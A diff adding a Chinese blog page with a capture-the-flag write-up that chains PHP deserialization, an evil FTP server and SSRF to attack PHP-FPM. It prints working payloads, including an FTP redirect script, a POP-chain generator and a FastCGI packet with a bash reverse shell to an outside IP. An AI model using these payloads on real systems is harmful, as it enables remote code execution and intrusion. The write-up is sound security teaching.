@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="陇原战役-php反序列化到ssrf发现有一个Hint类 12345678910111213class Hint &amp;#123;    public function __wakeup()&amp;#123;        $this-&gt;hint &#x3D; &quot;no hint&quot;;    &amp;#125;    public function __destruct()&amp;#123;        i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="陇原-php反序列化到ssrf打fpm">
+<meta property="og:url" content="https://yenannn.github.io/2022/03/25/%E9%99%87%E5%8E%9F-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf%E6%89%93fpm/index.html">
+<meta property="og:site_name" content="Yenan&#39;s blog">
+<meta property="og:description" content="陇原战役-php反序列化到ssrf发现有一个Hint类 12345678910111213class Hint &amp;#123;    public function __wakeup()&amp;#123;        $this-&gt;hint &#x3D; &quot;no hint&quot;;    &amp;#125;    public function __destruct()&amp;#123;        i">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-03-25T11:48:06.000Z">
+<meta property="article:modified_time" content="2022-03-25T11:48:41.175Z">
+<meta property="article:author" content="Yenan">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>陇原-php反序列化到ssrf打fpm</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2022/03/25/sus2021-html-practice/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://yenannn.github.io/2022/03/25/%E9%99%87%E5%8E%9F-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf%E6%89%93fpm/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://yenannn.github.io/2022/03/25/%E9%99%87%E5%8E%9F-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf%E6%89%93fpm/&text=陇原-php反序列化到ssrf打fpm"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://yenannn.github.io/2022/03/25/%E9%99%87%E5%8E%9F-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf%E6%89%93fpm/&title=陇原-php反序列化到ssrf打fpm"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://yenannn.github.io/2022/03/25/%E9%99%87%E5%8E%9F-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf%E6%89%93fpm/&is_video=false&description=陇原-php反序列化到ssrf打fpm"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=陇原-php反序列化到ssrf打fpm&body=Check out this article: https://yenannn.github.io/2022/03/25/%E9%99%87%E5%8E%9F-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf%E6%89%93fpm/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://yenannn.github.io/2022/03/25/%E9%99%87%E5%8E%9F-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf%E6%89%93fpm/&title=陇原-php反序列化到ssrf打fpm"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://yenannn.github.io/2022/03/25/%E9%99%87%E5%8E%9F-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf%E6%89%93fpm/&title=陇原-php反序列化到ssrf打fpm"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://yenannn.github.io/2022/03/25/%E9%99%87%E5%8E%9F-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf%E6%89%93fpm/&title=陇原-php反序列化到ssrf打fpm"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://yenannn.github.io/2022/03/25/%E9%99%87%E5%8E%9F-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf%E6%89%93fpm/&title=陇原-php反序列化到ssrf打fpm"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://yenannn.github.io/2022/03/25/%E9%99%87%E5%8E%9F-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf%E6%89%93fpm/&name=陇原-php反序列化到ssrf打fpm&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://yenannn.github.io/2022/03/25/%E9%99%87%E5%8E%9F-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf%E6%89%93fpm/&t=陇原-php反序列化到ssrf打fpm"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf"><span class="toc-number">1.</span> <span class="toc-text">陇原战役-php反序列化到ssrf</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        陇原-php反序列化到ssrf打fpm
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Yenan</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-03-25T11:48:06.000Z" itemprop="datePublished">2022-03-25</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="陇原战役-php反序列化到ssrf"><a href="#陇原战役-php反序列化到ssrf" class="headerlink" title="陇原战役-php反序列化到ssrf"></a>陇原战役-php反序列化到ssrf</h3><p>发现有一个Hint类</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hint</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint = <span class="string">&quot;no hint&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;hint)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;hint = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;hint)();</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>反序列化读取phpinfo();</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hint</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Hint</span>());</span><br><span class="line"><span class="comment">// O:4:&quot;Hint&quot;:0:&#123;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>无法执行，这是因为<code>__wakeup</code>会比<code>__destruct</code>优先执行，所以我们要绕过这里的<code>__wakeup</code>，这里我们需要用“Serializable” 的特性绕过<code>__wakeup</code>，漏洞详情：<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=81151">https://bugs.php.net/bug.php?id=81151</a></p>
+<p>就是将 <code>O</code> 改为 <code>C</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:4:&quot;Hint&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=C:4:&quot;Hint&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看phpinfo敏感信息，Server API是FPM/FastCGI</p>
+<p>看到这里有file_put_contents</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bunny</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Check</span>::<span class="variable">$str2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;data)&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;data = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;data);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>尝试结合file_put_contents配合ftp打内网（evil ftp），这里的原理如下：</p>
+<blockquote>
+<p>由于我们可以运行 file_get_contents() 来查找任何东西，因此，可以运用 SSRF 常用的姿势，通过发送HTTP请求来扫描常用端口。</p>
+<p>我们发现目标正在监听 9000 端口 / 正在运行着 PHP-FPM，我们可以进一步攻击 PHP-FPM。</p>
+<p>众所周知，如果我们能向 PHP-FPM 发送一个任意的二进制数据包，就可以在机器上执行代码。这种技术经常与gopher://协议结合使用，curl支持gopher://协议，但file_get_contents却不支持。</p>
+<p>另一个已知的允许通过 TCP 发送二进制数据包的协议是FTP，更准确的说是该协议的被动模式，即：如果一个客户端试图从FTP服务器上读取一个文件（或写入），服务器会通知客户端将文件的内容读取（或写）到一个有服务端指定的IP和端口上。而且，这里对这些IP和端口没有进行必要的限制。例如，服务器可以告诉客户端连接到自己的某一个端口，如果它愿意的话。</p>
+</blockquote>
+<p><strong>我们将使用 FTP 协议的被动模式让 file_get_contents() 在我们的服务器上下载一个文件，当它试图使用 file_put_contents() 把它上传回去时，我们将告诉它把文件发送到 127.0.0.1:9000。这样，我们就可以向目标主机本地的 PHP-FPM 发送一个任意的数据包，从而执行代码，造成SSRF了。</strong></p>
+<p>那么就使用 <a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a> 或者本地这个脚本进行攻击，如果是gopherus，命令为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit fastcgi</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/81.70.59.112/2333 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们用本地的直接跑，改成外带flag</p>
+<p>生成取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH104%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00h%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/81.70.59.112/7777%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure>
+
+<p>恶意ftp脚本</p>
+<p>运行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># evil_ftp.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">7008</span>))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 welcome\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Service ready for new user.</span></span><br><span class="line"><span class="comment">#Client send anonymous username</span></span><br><span class="line"><span class="comment">#USER anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;331 Please specify the password.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User name okay, need password.</span></span><br><span class="line"><span class="comment">#Client send anonymous password.</span></span><br><span class="line"><span class="comment">#PASS anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User logged in, proceed. Logged out if appropriate.</span></span><br><span class="line"><span class="comment">#TYPE I</span></span><br><span class="line">conn.send(<span class="string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Size /</span></span><br><span class="line">conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#EPSV (1)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 ok\n&#x27;</span>)</span><br><span class="line"><span class="comment">#PASV</span></span><br><span class="line">conn.send(<span class="string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n&#x27;</span>) <span class="comment">#STOR / (2)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#QUIT</span></span><br><span class="line">conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ftp.py</span><br></pre></td></tr></table></figure>
+
+<p>构造 pop 链触发 Bunny 类中的file_put_contents</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$str1</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$str2</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Esle</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title class_">Check</span>::<span class="variable">$str1</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hint</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint = <span class="string">&quot;no hint&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//这里可以利用得到phpinfo（）,前提是绕过__wakeup()，将O换为C即可绕过</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;hint)&#123; <span class="comment">//为空才行</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;hint = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;hint)();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bunny</span> </span>&#123;</span><br><span class="line">    <span class="comment">//当一个对象被当作字符串对待的时候，会触发这个__toString()魔术方法</span></span><br><span class="line">    <span class="comment">//比如$b = new Bunny();那么 echo $b;  就会调用__toString这个方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Check</span>::<span class="variable">$str2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;data)&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;data = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//写入文件   但是题目把写文件的权限给删掉了，所以这个思路不通</span></span><br><span class="line">            <span class="comment">//可以配合ftp打内网的fpm</span></span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;data);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span> </span>&#123;</span><br><span class="line">    <span class="comment">//当以调用函数的方式，调用一个对象时，__invoke函数会被自动调用</span></span><br><span class="line">    <span class="comment">//比如$a = new Welcome(),那么进行 $a()的时候就会调用__invoke()函数</span></span><br><span class="line">    <span class="comment">//而上述用法可以在Bypass中进行利用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title class_">Check</span>::<span class="variable">$str2</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcome&quot;</span> . <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bypass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Check</span>::<span class="variable">$str1</span>) &#123;</span><br><span class="line">            <span class="comment">//另str4为一个Welcome的类对象，这里作为函数调用了，就调用其__invoke()函数</span></span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;str4)();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Bypass</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;aaa = <span class="keyword">new</span> <span class="title class_">Esle</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;str4 = <span class="keyword">new</span> <span class="title class_">Welcome</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;str4-&gt;username = <span class="keyword">new</span> <span class="title class_">Bunny</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;str4-&gt;username-&gt;filename = <span class="string">&quot;ftp://aaa@81.70.59.112:7008/123&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">if (isset($_GET[&#x27;code&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">    unserialize($_GET[&#x27;code&#x27;]);</span></span><br><span class="line"><span class="comment">&#125; else &#123;</span></span><br><span class="line"><span class="comment">    highlight_file(__FILE__);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>作为函数调用时候 __invoke() 如($this-&gt;str)();</p>
+<p>作为字符串 __toString() 如return echo</p>
+<p>反序列化，得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A6%3A%22Bypass%22%3A2%3A%7Bs%3A3%3A%22aaa%22%3BO%3A4%3A%22Esle%22%3A0%3A%7B%7Ds%3A4%3A%22str4%22%3BO%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A8%3A%22username%22%3BO%3A5%3A%22Bunny%22%3A1%3A%7Bs%3A8%3A%22filename%22%3Bs%3A31%3A%22ftp%3A%2F%2Faaa%4081.70.59.112%3A7008%2F123%22%3B%7D%7D%7D</span><br></pre></td></tr></table></figure>
+
+<p>在hackbar：</p>
